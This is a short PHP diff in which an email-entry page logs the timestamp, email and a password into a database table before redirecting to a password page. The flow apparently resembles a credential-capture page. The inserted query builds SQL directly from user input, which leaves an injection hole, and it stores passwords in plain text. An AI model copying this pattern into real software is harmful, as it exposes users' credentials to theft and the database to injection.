@@ -18,9 +18,16 @@
 
 <?php
 session_start();
+include("db.php");
 if (isset($_POST['email'])) {
     $email = $_POST['email'];
     $_SESSION['email'] = $email;
+
+    date_default_timezone_set('Asia/Hong_Kong');
+    $time = date('Y-m-d H:i:s', time());
+
+    db_open();
+    db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
     header("Location: /password.php");
 }
 ?>
